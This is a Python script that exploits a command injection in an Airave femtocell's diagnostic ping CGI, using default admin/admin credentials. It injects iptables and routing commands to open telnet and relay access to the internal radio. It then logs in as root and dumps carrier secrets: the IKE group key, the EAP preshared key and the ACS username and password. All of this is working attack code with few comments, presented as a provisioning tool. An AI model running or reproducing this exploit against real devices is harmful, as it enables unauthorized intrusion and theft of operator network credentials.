#!/usr/bin/env python3
"""Pull Airave SeGW + ACS credentials from a unit on the LAN.

Run on Linux on the Airave LAN with Python 3.8+ stdlib only. Opens host
telnet and the radio relays through the diagnostic ping injection, then
logs into the radio and prints the values cdma-femto needs to enroll
the FAP.

Usage:
    ./airave-provision.py
    ./airave-provision.py --host 192.168.17.1
    ./airave-provision.py --json
"""
from __future__ import annotations

import argparse
import json
import re
import select
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass

DEFAULT_HOST = "192.168.17.1"
LAN_CIDR = "192.168.17.0/24"
RADIO_IP = "192.168.255.2"
RADIO_GW = "192.168.255.1"
RADIO_TELNET_PORT = 23023
RADIO_SSH_PORT = 23022
CGI_PAYLOAD_MAX = 447
SENTINEL = "XQXCMD_END_7741"

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

SSH_OPTS = (
    "KexAlgorithms=+diffie-hellman-group1-sha1",
    "HostKeyAlgorithms=+ssh-rsa",
    "PubkeyAcceptedAlgorithms=+ssh-rsa",
    "Ciphers=+aes128-cbc,aes256-cbc,3des-cbc",
    "MACs=+hmac-sha1",
    "StrictHostKeyChecking=accept-new",
    "PreferredAuthentications=password",
)

ENV_KEYS = (
    "eap_preshared_key",
    "serialno",
    "nai_domain",
    "username",
    "password",
    "ike_group_key",
)

TEXT_FIELDS = (
    ("FEID", "feid"),
    ("IKE_GROUP_KEY", "ike_group_key"),
    ("EAP_IDENTITY", "eap_identity"),
    ("EAP_PASSWORD", "eap_password"),
    ("ACS_USERNAME", "acs_username"),
    ("ACS_PASSWORD", "acs_password"),
)


@dataclass
class Identity:
    serial: str
    oui: str
    super_password: str

    @property
    def radio_user(self) -> str:
        return f"{self.oui}-cdmaFAP-{self.serial}"


class Telnet:
    def __init__(self, host: str, port: int, timeout: float = 8.0):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.setblocking(False)
        self.buf = b""

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()

    def _negotiate(self, data: bytes) -> bytes:
        out = bytearray()
        i, n = 0, len(data)
        while i < n:
            if data[i] != IAC:
                out.append(data[i])
                i += 1
                continue
            if i + 1 >= n:
                break
            cmd = data[i + 1]
            if cmd == IAC:
                out.append(IAC)
                i += 2
                continue
            if cmd in (WILL, WONT, DO, DONT):
                if i + 2 >= n:
                    break
                if cmd in (WILL, DO):
                    reply = WONT if cmd == WILL else DONT
                    self.sock.sendall(bytes((IAC, reply, data[i + 2])))
                i += 3
                continue
            if cmd == SB:
                j = i + 2
                while j < n - 1 and not (data[j] == IAC and data[j + 1] == SE):
                    j += 1
                i = j + 2
                continue
            i += 2
        return bytes(out)

    def read_until(self, marker, timeout: float = 8.0):
        markers = marker if isinstance(marker, (list, tuple)) else [marker]
        markers = [m if isinstance(m, bytes) else m.encode() for m in markers]
        deadline = time.time() + timeout
        while True:
            for m in markers:
                idx = self.buf.find(m)
                if idx >= 0:
                    head, self.buf = self.buf[:idx], self.buf[idx + len(m) :]
                    return head, m
            if time.time() >= deadline:
                out, self.buf = self.buf, b""
                return out, None
            r, _, _ = select.select([self.sock], [], [], 0.2)
            if not r:
                continue
            try:
                data = self.sock.recv(4096)
            except BlockingIOError:
                continue
            if not data:
                out, self.buf = self.buf, b""
                return out, None
            self.buf += self._negotiate(data)

    def write(self, s):
        self.sock.sendall(s if isinstance(s, bytes) else s.encode())

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def log(msg: str) -> None:
    print(msg, file=sys.stderr)


def cgi_inject(command: str) -> str:
    return f"; {command} ; #"


def nat_relay(lan_cidr: str, lan_port: int, radio_port: int) -> str:
    prerouting = (
        f"/usr/sbin/iptables -t nat -A PREROUTING -i group1 -p tcp "
        f"--dport {lan_port} -j DNAT --to-destination {RADIO_IP}:{radio_port}"
    )
    postrouting = (
        f"/usr/sbin/iptables -t nat -A POSTROUTING -s {lan_cidr} -o group2 "
        f"-p tcp -d {RADIO_IP} --dport {radio_port} -j SNAT --to-source {RADIO_GW}"
    )
    return cgi_inject(f"{prerouting} ; {postrouting}")


def unlock_payloads(lan_cidr: str):
    accept = (
        f"/usr/sbin/iptables -I INPUT -p tcp --dport 23 -s {lan_cidr} -j ACCEPT ; "
        f"/usr/sbin/iptables -I INPUT -p tcp --dport 443 -s {lan_cidr} -j ACCEPT"
    )
    return (
        ("host telnet and https", cgi_inject(accept)),
        ("enable forwarding", cgi_inject("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward")),
        (
            "remove radio blackhole route",
            cgi_inject(f"/usr/sbin/ip route del blackhole {RADIO_IP} table 101"),
        ),
        ("radio SSH relay", nat_relay(lan_cidr, RADIO_SSH_PORT, 22)),
        ("radio telnet relay", nat_relay(lan_cidr, RADIO_TELNET_PORT, 23)),
    )


def cgi_post(host: str, payload: str, timeout: float = 20) -> None:
    if len(payload) > CGI_PAYLOAD_MAX:
        raise SystemExit(
            f"CGI payload is {len(payload)} bytes, limit is {CGI_PAYLOAD_MAX}"
        )
    body = urllib.parse.urlencode(
        {
            "todo": "ping_test",
            "this_file": "diag.htm",
            "next_file": "diag.htm",
            "h_use_redirect": "disable",
            "c4_IPAddr": payload,
        }
    ).encode()
    url = f"http://{host}/setup.cgi"
    req = urllib.request.Request(url, data=body, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp.read()
            return
    except urllib.error.HTTPError as exc:
        if exc.code != 401:
            raise
    auth = urllib.request.HTTPPasswordMgrWithDefaultRealm()
    auth.add_password(None, url, "admin", "admin")
    opener = urllib.request.build_opener(urllib.request.HTTPBasicAuthHandler(auth))
    with opener.open(req, timeout=timeout) as resp:
        resp.read()


def unlock(host: str, lan_cidr: str) -> None:
    steps = unlock_payloads(lan_cidr)
    for i, (label, payload) in enumerate(steps, 1):
        log(f"unlock {i}/{len(steps)}: {label}")
        cgi_post(host, payload)


def wrap_shell(cmd: str) -> str:
    return f"{cmd}; __rc=$?; _s1=XQXCMD; _s2=END_7741; echo ${{_s1}}_${{_s2}}$__rc"


def run_commands(tn: Telnet, commands, timeout: float = 8.0) -> list[str]:
    out = []
    for cmd in commands:
        wrapped = wrap_shell(cmd)
        tn.write(wrapped + "\n")
        data, _ = tn.read_until(SENTINEL, timeout=timeout)
        tn.read_until(b"\n", timeout=1.0)
        lines, seen = [], False
        for ln in data.decode("utf-8", "replace").splitlines():
            ln = ln.strip("\r")
            if not seen and (wrapped in ln or cmd in ln):
                seen = True
                continue
            lines.append(ln)
        out.append("\n".join(lines).strip())
    return out


def host_shell(host: str, commands, timeout: float = 8.0) -> str:
    with Telnet(host, 23, timeout=timeout) as tn:
        tn.read_until(b"#", timeout=4)
        chunks = run_commands(tn, commands, timeout=timeout)
        tn.write(b"exit\n")
    return "\n".join(chunks)


def parse_kv_block(text: str) -> dict:
    found = {}
    for ln in text.splitlines():
        spaced = re.search(r"(\w+)\s*=\s*(\S+)", ln)
        if spaced:
            found[spaced.group(1)] = spaced.group(2)
        exact = re.match(r"^([A-Za-z0-9_]+)=(.*)$", ln.strip())
        if exact:
            found[exact.group(1)] = exact.group(2)
    return found


def parse_host_identity(text: str) -> Identity:
    kv = parse_kv_block(text)
    serial = kv.get("cwmp_serial_number") or kv.get("serialno")
    oui = kv.get("cwmp_manufacturer_oui") or kv.get("rata_oui")
    password = kv.get("super_password") or kv.get("password")
    if not (serial and oui and password):
        raise SystemExit(f"host identity missing from cmld_client:\n{text}")
    return Identity(serial=serial, oui=oui, super_password=password)


def masked(value: str | None) -> bool:
    return bool(value) and set(value) <= {"*"}


def radio_login(host: str, port: int, username: str, password: str, timeout: float = 12.0):
    tn = Telnet(host, port, timeout=timeout)
    _, marker = tn.read_until([b"login:", b"Login:"], timeout=timeout)
    if marker is None:
        tn.close()
        raise SystemExit("radio telnet: no login prompt (relay down or slot busy)")
    tn.write(username + "\n")
    _, marker = tn.read_until(
        [b"assword:", b"incorrect", b"Incorrect", b"login:"], timeout=timeout
    )
    if marker != b"assword:":
        tn.close()
        return None
    tn.write(password + "\n")
    data, marker = tn.read_until(
        [b"# ", b"$ ", b"incorrect", b"Incorrect"], timeout=timeout
    )
    blob = (data + tn.buf).decode("utf-8", "replace")
    if marker in (b"incorrect", b"Incorrect") or "incorrect" in blob.lower():
        tn.close()
        return None
    if marker == b"$ ":
        tn.write("su\n")
        tn.read_until([b"assword:"], timeout=6)
        tn.write("root\n")
        _, marker = tn.read_until([b"# "], timeout=6)
        if marker is None:
            tn.close()
            return None
    return tn


def collect_radio(host: str, port: int, ident: Identity):
    log(f"radio telnet {host}:{port} as {ident.radio_user}")
    tn = radio_login(host, port, ident.radio_user, ident.super_password)
    if tn is None:
        raise SystemExit("radio login failed")
    env_cmds = [f"fw_printenv {key}" for key in ENV_KEYS]
    extra_cmds = (
        "strings /dev/mtdblock8 2>/dev/null",
        "grep -e ^acsUserName -e ^acsPassword "
        "/conf_files/config/nptr_config/nptr69.conf 2>/dev/null",
    )
    try:
        chunks = run_commands(tn, [*env_cmds, *extra_cmds], timeout=20.0)
        tn.write("exit\n")
    finally:
        tn.close()
    env = {}
    for chunk in chunks[: len(ENV_KEYS)]:
        env.update(parse_kv_block(chunk))
    raw_env = parse_kv_block(chunks[len(ENV_KEYS)])
    acs = parse_kv_block(chunks[len(ENV_KEYS) + 1])
    for key in ENV_KEYS:
        if masked(env.get(key)) or key not in env:
            raw = raw_env.get(key)
            if raw and not masked(raw):
                env[key] = raw
    return env, acs


def assemble(ident: Identity, env: dict, acs: dict) -> dict:
    serial = env.get("serialno") or ident.serial
    nai = env.get("nai_domain") or ""
    result = {
        "feid": serial,
        "ike_group_key": env.get("ike_group_key") or "",
        "eap_identity": f"{serial}@{nai}" if nai else serial,
        "eap_password": env.get("eap_preshared_key") or "",
        "acs_username": acs.get("acsUserName") or env.get("username") or ident.radio_user,
        "acs_password": acs.get("acsPassword") or env.get("password") or ident.super_password,
    }
    missing = [k for k, v in result.items() if not v]
    if missing:
        raise SystemExit(f"missing fields: {', '.join(missing)}")
    if masked(result["ike_group_key"]):
        raise SystemExit("ike_group_key still masked. Env scrape failed")
    return result


def print_text(result: dict) -> None:
    for label, key in TEXT_FIELDS:
        print(f"{label}={result[key]}")


def print_ssh(host: str, user: str, password: str) -> None:
    opts = " ".join(f"-o {opt}" for opt in SSH_OPTS)
    print()
    print(f"ssh -p {RADIO_SSH_PORT} {opts} {user}@{host}")
    print(f"password: {password}")
    print("then su, password root")


def main() -> None:
    ap = argparse.ArgumentParser(
        description="Unlock an Airave on the LAN and print SeGW/ACS credentials."
    )
    ap.add_argument("--host", default=DEFAULT_HOST, help="Airave LAN address")
    ap.add_argument("--lan", default=LAN_CIDR, help="LAN cidr for iptables")
    ap.add_argument(
        "--radio-port",
        type=int,
        default=RADIO_TELNET_PORT,
        help="DNAT port for radio telnet",
    )
    ap.add_argument("--skip-unlock", action="store_true")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    if not args.skip_unlock:
        unlock(args.host, args.lan)
        time.sleep(0.5)

    log(f"host telnet {args.host}:23")
    ident = parse_host_identity(
        host_shell(
            args.host,
            [
                "/usr/sbin/cmld_client show | /bin/grep -e cwmp_serial_number "
                "-e cwmp_manufacturer_oui -e super_password"
            ],
        )
    )
    log(f"radio user {ident.radio_user}")
    result = assemble(ident, *collect_radio(args.host, args.radio_port, ident))
    if args.json:
        json.dump(result, sys.stdout, indent=2)
        sys.stdout.write("\n")
    else:
        print_text(result)
    print_ssh(args.host, ident.radio_user, ident.super_password)


if __name__ == "__main__":
    main()
